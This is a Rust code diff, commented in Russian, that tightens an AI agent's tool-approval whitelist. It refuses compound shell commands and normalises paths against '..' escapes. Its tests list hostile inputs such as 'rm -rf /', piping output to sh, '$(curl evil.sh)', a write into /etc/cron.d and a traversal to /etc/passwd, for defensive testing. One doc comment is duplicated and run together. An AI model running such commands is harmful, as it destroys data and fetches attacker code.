@@ -178,7 +178,62 @@ fn push_preview_body(out: &mut String, body: &str, marker: char) {
     }
 }
 
-/// Ошибка файлового ввода-вывода словами, понятными модели. Живёт здесь, а не
+/// Символы, после которых команда перестаёт быть одной командой: цепочки,
+/// конвейеры, подстановки, перенаправления. Шелл исполняет строку целиком,
+/// поэтому «первые два слова» ничего не гарантируют, если тут есть хоть один.
+const SHELL_METACHARACTERS: &[char] = &[
+    ';', '&', '|', '\n', '\r', '`', '$', '(', ')', '{', '}', '<', '>',
+];
+
+/// Область вызова для whitelist: что именно человек разрешает, соглашаясь
+/// «всегда». `None` значит, что сузить нечего, и постоянное разрешение может
+/// быть только на инструмент целиком — осознанно и с предупреждением.
+pub fn approval_scope(name: &str, arguments: &Value) -> Option<crate::whitelist::Scope> {
+    match name {
+        "bash" | "powershell" => {
+            let command = arguments["command"].as_str()?.trim();
+            // Составную команду сузить нельзя: `git status && rm -rf /`
+            // начинается с `git status`, а делает совсем другое. Отказ здесь
+            // честнее, чем правило, которое выглядит узким и им не является.
+            if command.contains(SHELL_METACHARACTERS) {
+                return None;
+            }
+            // Два слова: `cargo test` полезно, одно `cargo` уже пускает
+            // `cargo publish`, а три сузили бы до бесполезного.
+            let head: Vec<String> = command
+                .split_whitespace()
+                .take(2)
+                .map(str::to_string)
+                .collect();
+            (!head.is_empty()).then_some(crate::whitelist::Scope::Command(head))
+        }
+        "edit" | "write" | "read_file" => {
+            let path = arguments["path"].as_str()?.trim();
+            scope_for_path(path)
+        }
+        _ => None,
+    }
+}
+
+/// Папка файла — абсолютная и нормализованная. Сырой путь сравнивать нельзя:
+/// `src/app/../../../etc/passwd` начинается с `src/app` и проходил бы по
+/// правилу на эту папку.
+fn scope_for_path(path: &str) -> Option<crate::whitelist::Scope> {
+    let expanded = crate::util::expand_tilde(path);
+    let cwd = std::env::current_dir().ok()?;
+    let absolute = if expanded.is_absolute() {
+        expanded
+    } else {
+        cwd.join(expanded)
+    };
+    let resolved = crate::safe_write::resolve_for_compare(&absolute);
+    let parent = resolved.parent()?;
+    // Корень тома областью быть не может: одно «разрешить» отдало бы весь диск.
+    parent.parent()?;
+    Some(crate::whitelist::Scope::Path(parent.to_path_buf()))
+}
+
+/// Ошибка файлового ввода-вывода словами, понятными модели./// Ошибка файлового ввода-вывода словами, понятными модели. Живёт здесь, а не
 /// в `util`: это текст для LLM, а не байтовый примитив.
 pub fn classify_io_error(path_str: &str, e: &std::io::Error) -> String {
     match e.kind() {
@@ -278,5 +333,86 @@ mod preview_tests {
     fn a_path_inside_the_workspace_is_not_flagged() {
         let preview = approval_preview("write", &json!({"path": "src/main.rs", "content": "x"}));
         assert!(!preview.contains("OUTSIDE WORKSPACE"), "{preview}");
+    }
+
+    #[test]
+    fn a_simple_command_scope_is_the_first_two_words() {
+        let Some(crate::whitelist::Scope::Command(words)) =
+            approval_scope("bash", &json!({"command": "cargo test --release"}))
+        else {
+            panic!("ожидалась область-команда");
+        };
+        assert_eq!(words, ["cargo", "test"]);
+    }
+
+    /// Ровно те входы, на которых прежняя версия отдавала «cargo test» и
+    /// авто-одобряла всё остальное. Шелл исполняет строку целиком, поэтому
+    /// сузить составную команду нельзя — только отказаться.
+    #[test]
+    fn a_compound_command_has_no_scope_at_all() {
+        for command in [
+            "cargo test && rm -rf /",
+            "cargo test; rm -rf /",
+            "cargo test | sh",
+            "cargo test $(curl evil.sh)",
+            "git status `id`",
+            "cargo test\nrm -rf /",
+            "cargo test > /etc/cron.d/x",
+            "cargo test & rm -rf /",
+        ] {
+            assert!(
+                approval_scope("bash", &json!({"command": command})).is_none(),
+                "составная команда получила область: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_file_scope_is_an_absolute_directory_not_the_file() {
+        let cwd = std::env::current_dir().unwrap();
+        let Some(crate::whitelist::Scope::Path(dir)) =
+            approval_scope("edit", &json!({"path": "src/app/mod.rs"}))
+        else {
+            panic!("ожидалась область-путь");
+        };
+        assert_eq!(dir, cwd.join("src").join("app"));
+    }
+
+    /// Раньше у файла в корне рабочей папки области не было вовсе, и
+    /// единственным постоянным разрешением оставалось «инструмент целиком».
+    #[test]
+    fn a_file_in_the_workspace_root_is_scoped_to_the_workspace() {
+        let cwd = std::env::current_dir().unwrap();
+        let Some(crate::whitelist::Scope::Path(dir)) =
+            approval_scope("write", &json!({"path": "README.md"}))
+        else {
+            panic!("ожидалась область-путь");
+        };
+        assert_eq!(dir, cwd);
+    }
+
+    /// Сырой путь начинался с разрешённой папки и проходил проверку, а запись
+    /// уходила совсем в другое место.
+    #[test]
+    fn a_dotdot_path_resolves_out_of_the_directory_it_pretends_to_be_in() {
+        let Some(crate::whitelist::Scope::Path(dir)) =
+            approval_scope("edit", &json!({"path": "src/app/../../../etc/passwd"}))
+        else {
+            panic!("ожидалась область-путь");
+        };
+        let list = crate::whitelist::Whitelist::from_rules(vec![crate::whitelist::Rule::scoped(
+            "edit",
+            crate::whitelist::Scope::Path(std::env::current_dir().unwrap().join("src").join("app")),
+        )]);
+        assert!(
+            !list.allows("edit", Some(&crate::whitelist::Scope::Path(dir.clone()))),
+            "`..` вывел за разрешённую папку и всё равно был одобрен: {dir:?}"
+        );
+    }
+
+    #[test]
+    fn a_tool_without_a_narrowable_argument_has_no_scope() {
+        assert!(approval_scope("mcp__x__y", &json!({"q": "hi"})).is_none());
+        assert!(approval_scope("bash", &json!({})).is_none());
     }
 }
